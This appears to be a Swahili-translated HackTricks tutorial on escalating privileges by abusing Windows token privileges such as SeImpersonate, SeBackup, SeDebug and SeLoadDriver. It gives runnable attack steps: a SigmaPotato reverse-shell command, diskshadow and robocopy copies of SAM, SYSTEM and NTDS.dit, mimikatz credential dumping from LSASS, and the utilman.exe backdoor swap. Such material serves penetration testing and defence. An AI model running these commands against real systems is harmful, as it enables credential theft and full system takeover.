# Kutumia Vibaya Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Ikiwa **hujui Windows Access Tokens ni nini**, soma ukurasa huu kabla ya kuendelea:


{{#ref}}
access-tokens.md
{{#endref}}

**Huenda ukaweza kuongeza privileges kwa kutumia vibaya tokens ambazo tayari unazo**

### SeImpersonatePrivilege

Hii ni privilege ambayo inamilikiwa na process yoyote na kuruhusu impersonation (lakini si kuunda) token yoyote, mradi handle yake inaweza kupatikana. Token yenye privileges inaweza kupatikana kutoka kwa Windows service (DCOM) kwa kuishawishi ifanye authentication ya NTLM dhidi ya exploit, na hivyo kuwezesha kuanzishwa kwa process yenye SYSTEM privileges.<sup>[[2]](#references)</sup> Vulnerability hii inaweza kutumiwa kwa tools mbalimbali, kama vile [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (ambayo inahitaji winrm iwe disabled), [SweetPotato](https://github.com/CCob/SweetPotato), na [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Maelezo ya kisasa kwa operators:

- **JuicyPotato ni legacy**: kwenye Windows 10 1809+/Server 2019+, pendelea **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, au **PrintSpoofer**, kulingana na RPC/COM surface ambayo bado inaweza kufikiwa.
- Ikiwa uli-compromise service inayotumika kama **`LOCAL SERVICE`** au **`NETWORK SERVICE`** na `whoami /priv` inaonyesha **filtered token** bila `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, kwanza rejesha **default privilege set** ya account hiyo (kwa mfano kwa kutumia **FullPowers**) kisha ujaribu tena potato family.<sup>[[3]](#references)</sup>
- Baadhi ya forks mpya ni rahisi zaidi kwa operators kuliko tools za awali. Kwa mfano, **SigmaPotato** huongeza reflection/in-memory execution na compatibility ya kisasa ya Windows, huku **PrintNotifyPotato** ikitumia vibaya PrintNotify COM service na mara nyingi kusaidia wakati classic Spooler path imezimwa.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Inafanana sana na **SeImpersonatePrivilege**, itatumia **mbinu ile ile** kupata token yenye privileged.\
Kisha, privilege hii inaruhusu **kuassign primary token** kwa process mpya/iliyositishwa. Kwa kutumia token ya privileged impersonation, unaweza kutengeneza primary token (DuplicateTokenEx).\
Ukitumia token hiyo, unaweza kuunda **process mpya** kwa kutumia 'CreateProcessAsUser' au kuunda process iliyositishwa na **kuweka token** (kwa ujumla, huwezi kurekebisha primary token ya process inayoendelea).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Ikiwa token hii imewezeshwa, unaweza kutumia **KERB_S4U_LOGON** kupata **impersonation token** ya user mwingine yeyote bila kujua credentials zake, **kuongeza group yoyote** (admins) kwenye token, kuweka **integrity level** ya token kuwa "**medium**", na kuassign token hii kwa **thread ya sasa** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Mfumo husababisha **kutoa udhibiti kamili wa ufikiaji wa kusoma** kwa file yoyote (ikiwa imewekewa kikomo kwenye operations za kusoma) kupitia privilege hii. Inatumika **kusoma password hashes za accounts za local Administrator** kutoka kwenye registry, kisha tools kama "**psexec**" au "**wmiexec**" zinaweza kutumiwa pamoja na hash hiyo (mbinu ya Pass-the-Hash). Hata hivyo, mbinu hii hushindwa chini ya hali mbili: wakati account ya Local Administrator imezimwa, au wakati kuna policy inayoondoa administrative rights kutoka kwa Local Administrators wanaounganisha remotely.<sup>[[2]](#references)</sup>\
Kwa matumizi ya kawaida, workflow ya built-in iliyoaminika zaidi kwa kawaida ni **VSS + `robocopy /b`**: tengeneza/expose shadow copy, kisha copy `SAM`/`SYSTEM` au `NTDS.dit` katika **backup mode**, ambayo hupita file ACLs.<sup>[[4]](#references)</sup>
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Unaweza **kutumia vibaya privilege hii** kwa:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- kumfuata **IppSec** katika [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Au kama ilivyoelezwa katika sehemu ya **escalating privileges with Backup Operators** ya:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Ruhusa ya **write access** kwa faili yoyote ya mfumo, bila kujali Access Control List (ACL) ya faili, hutolewa na privilege hii. Hii hufungua uwezekano mwingi wa escalation, ikiwemo uwezo wa **modify services**, kufanya DLL Hijacking, na kuweka **debuggers** kupitia Image File Execution Options, pamoja na techniques nyingine mbalimbali.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege ni permission yenye nguvu, hasa muhimu mtumiaji anapokuwa na uwezo wa ku-impersonate tokens, lakini pia pale ambapo SeImpersonatePrivilege haipo. Uwezo huu unategemea uwezo wa ku-impersonate token inayomwakilisha mtumiaji huyo huyo na ambayo integrity level yake haizidi ile ya process ya sasa.<sup>[[2]](#references)</sup>

**Mambo Muhimu:**

- **Impersonation bila SeImpersonatePrivilege:** Inawezekana kutumia SeCreateTokenPrivilege kwa EoP kwa ku-impersonate tokens chini ya conditions maalum.
- **Conditions za Token Impersonation:** Impersonation yenye mafanikio inahitaji token inayolengwa iwe ya mtumiaji huyo huyo na iwe na integrity level iliyo chini au sawa na integrity level ya process inayojaribu kufanya impersonation.
- **Uundaji na Marekebisho ya Impersonation Tokens:** Watumiaji wanaweza kuunda impersonation token na kuiboresha kwa kuongeza SID ya privileged group (Security Identifier).

### SeLoadDriverPrivilege

Privilege hii inaruhusu **load na unload device drivers** kwa kuunda registry entry yenye values maalum za `ImagePath` na `Type`. Kwa kuwa direct write access kwa `HKLM` (HKEY_LOCAL_MACHINE) imezuiwa, `HKCU` (HKEY_CURRENT_USER) lazima itumike badala yake. Hata hivyo, ili kufanya `HKCU` itambulike na kernel kwa ajili ya driver configuration, path maalum lazima ifuatwe.<sup>[[2]](#references)</sup>

Matumizi ya kisasa ya offensive kwa kawaida ni **BYOVD** (bring your own vulnerable driver): load **signed but vulnerable** kernel driver, kisha utumie IOCTLs zake kuzima protections au kufikia kernel code execution. Kumbuka kwamba kwenye Windows 11/Server builds za hivi karibuni, **Microsoft vulnerable driver blocklist** na/au **HVCI/Memory Integrity** mara nyingi huvuruga chains za zamani za public; kwa hiyo mifano ya mtindo wa `szkg64.sys` si ya kuaminika kwa ujumla tena.

Path hii ni `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, ambapo `<RID>` ni Relative Identifier ya mtumiaji wa sasa. Ndani ya `HKCU`, path hii yote lazima iundwe, na values mbili lazima ziwekwe:<sup>[[2]](#references)</sup>

- `ImagePath`, ambayo ni path ya binary itakayo-execute
- `Type`, yenye value ya `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Hatua za Kufuata:**

1. Fikia `HKCU` badala ya `HKLM` kwa sababu ya restricted write access.
2. Unda path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` ndani ya `HKCU`, ambapo `<RID>` inawakilisha Relative Identifier ya mtumiaji wa sasa.
3. Weka `ImagePath` iwe execution path ya binary.
4. Weka `Type` kuwa `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Njia zaidi za kutumia vibaya privilege hii katika [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Hii inafanana na **SeRestorePrivilege**. Kazi yake kuu humruhusu **process kuchukua ownership ya object**, ikikwepa hitaji la ruhusa ya wazi ya discretionary access kupitia utoaji wa access rights za WRITE_OWNER. Mchakato huu huhusisha kwanza kupata ownership ya registry key inayolengwa kwa madhumuni ya kuandika, kisha kubadilisha DACL ili kuwezesha shughuli za kuandika.<sup>[[2]](#references)</sup>
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Privilege hii inaruhusu **kudebug process nyingine**, pamoja na kusoma na kuandika kwenye memory. Mikakati mbalimbali ya memory injection, yenye uwezo wa kukwepa antivirus nyingi na host intrusion prevention solutions, inaweza kutumiwa kwa privilege hii.<sup>[[2]](#references)</sup>

Kwenye Windows za kisasa, kumbuka kuwa `SeDebugPrivilege` kwa kawaida inatosha kufungua **non-protected SYSTEM processes** na kunakili tokens zao, lakini **si hakikisho kwamba unaweza kugusa** **LSASS**. Ikiwa **RunAsPPL / LSA Protection** imewashwa, non-protected processes haziwezi kusoma au kuingiza code kwenye LSASS hata kama `SeDebugPrivilege` ipo. Katika hali hiyo, steal token kutoka kwa non-PPL SYSTEM process nyingine, au chain na PPL bypass/BYOVD badala ya kudhani kuwa `procdump` itafanya kazi. Kwa mfano kamili wa token-copy unaotumia `SeDebugPrivilege` + `SeImpersonatePrivilege`, angalia [ukurasa huu](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Unaweza kutumia [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) kutoka kwenye [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) ili **kunasa memory ya process**. Hasa, hii inaweza kutumika kwenye process ya **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, ambayo inawajibika kuhifadhi credentials za mtumiaji baada ya mtumiaji kuingia kwenye mfumo kwa mafanikio.

Kisha unaweza kupakia dump hii kwenye mimikatz ili kupata passwords:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Ikiwa unataka kupata shell ya `NT SYSTEM` unaweza kutumia:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Haki hii (Perform volume maintenance tasks) inaruhusu kufungua raw volume device handles (mfano, \\.\C:) kwa direct disk I/O inayopita NTFS ACLs. Ukiwa nayo unaweza kunakili bytes za faili yoyote kwenye volume kwa kusoma blocks zake za msingi, hivyo kuwezesha arbitrary file read ya taarifa nyeti (mfano, machine private keys katika %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS kupitia VSS).<sup>[[5]](#references)</sup> Ina athari kubwa hasa kwenye CA servers, ambapo ku-exfiltrate CA private key kunawezesha kutengeneza Golden Certificate ya kujifanya principal yoyote.<sup>[[6]](#references)</sup>

Tazama techniques na mitigations za kina:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Kagua privileges
```
whoami /priv
```
The **tokens zinazoonekana kama Disabled** kwa kawaida zinaweza kuwashwa, hivyo mara nyingi unaweza kutumia vibaya privileges za _Enabled_ na _Disabled_.

### Washa tokens zote

Ikiwa una privileges zilizozimwa, unaweza kutumia script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) kuwasha tokens zote:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Au **script** iliyowekwa ndani ya [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Jedwali

Cheatsheet kamili ya token privileges inapatikana kwenye [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), muhtasari ulio hapa chini utaorodhesha tu njia za moja kwa moja za kutumia privilege hiyo kupata admin session au kusoma mafaili nyeti.<sup>[[1]](#references)</sup>

| Privilege                  | Athari      | Zana                    | Njia ya utekelezaji                                                                                                                                                                                                                                                                                                                                     | Maelezo                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | zana ya 3rd party          | _"Itamruhusu mtumiaji ku-impersonate tokens na kufanya privesc hadi nt system kwa kutumia zana kama potato.exe, rottenpotato.exe na juicypotato.exe"_                                                                                                                                                                                                      | Shukrani kwa [Aurélien Chalot](https://twitter.com/Defte_) kwa update. Nitajaribu kuiandika tena kwa mtindo wa recipe hivi karibuni.                                                                                                                                                                                         |
| **`SeBackup`**             | **Tishio**  | _**Amri za built-in**_ | Soma mafaili nyeti kwa `robocopy /b` au copy helpers maalumu zinazoelewa SeBackup.                                                                                                                                                                                                                                                                 | <p>- Ni nzuri kwa `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, na wakati mwingine `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` ni rahisi kutumia, lakini SeBackup cmdlets/APIs maalumu mara nyingi huwa flexible zaidi kwa mafaili yaliyofungwa/yanayotumika.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | zana ya 3rd party          | Unda token ya kiholela iliyo na local admin rights kwa kutumia `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplicate token ya SYSTEM ya **non-PPL** au dump memory kutoka kwenye process isiyolindwa.                                                                                                                                                                                                                                                                 | <p>LSASS dumping kwa kawaida huzuiwa ikiwa RunAsPPL/LSA Protection imewezeshwa.</p><p>Script inapatikana kwenye [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | zana ya 3rd party          | Tumia **Potato family** / named-pipe impersonation kuanzisha SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, n.k.).                                                                                                                                                                                    | <p>Ni ya vitendo zaidi kutoka kwenye service accounts kama IIS APPPOOL, MSSQL, scheduled tasks, au context yoyote ambayo tayari inamiliki `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | zana ya 3rd party          | <p>1. Load kernel driver iliyosainiwa lakini yenye vulnerability (BYOVD)<br>2. Tumia IOCTLs za driver kupata kernel R/W, kuzima security tooling, au kupata SYSTEM<br><br>Vinginevyo, privilege hii inaweza kutumika ku-unload drivers zinazohusiana na security kwa kutumia <code>fltMC</code> builtin command, yaani <code>fltMC sysmondrv</code></p>                     | <p>Drivers za zamani za umma kama <code>szkg64.sys</code> zinazuiwa zaidi kwenye Windows za kisasa na vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Launch PowerShell/ISE ikiwa na SeRestore privilege.<br>2. Enable privilege hiyo kwa <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Rename utilman.exe kuwa utilman.old<br>4. Rename cmd.exe kuwa utilman.exe<br>5. Lock console na ubonyeze Win+U</p> | <p>Shambulio linaweza kugunduliwa na baadhi ya AV software.</p><p>Njia mbadala inategemea kubadilisha service binaries zilizohifadhiwa kwenye "Program Files" kwa kutumia privilege hiyo hiyo</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Amri za built-in**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Rename cmd.exe kuwa utilman.exe<br>4. Lock console na ubonyeze Win+U</p>                                                                                                                                       | <p>Shambulio linaweza kugunduliwa na baadhi ya AV software.</p><p>Njia mbadala inategemea kubadilisha service binaries zilizohifadhiwa kwenye "Program Files" kwa kutumia privilege hiyo hiyo.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | zana ya 3rd party          | <p>Manipulate tokens ili zijumuishe local admin rights. Huenda ikahitaji SeImpersonate.</p><p>Bado haijathibitishwa.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## Marejeo

- [1] [gtworek/Priv2Admin - exploitation paths from Windows privileges to admin](https://github.com/gtworek/Priv2Admin)
- [2] [Abusing Token Privileges For LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Give Me Back My Privileges! Please?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
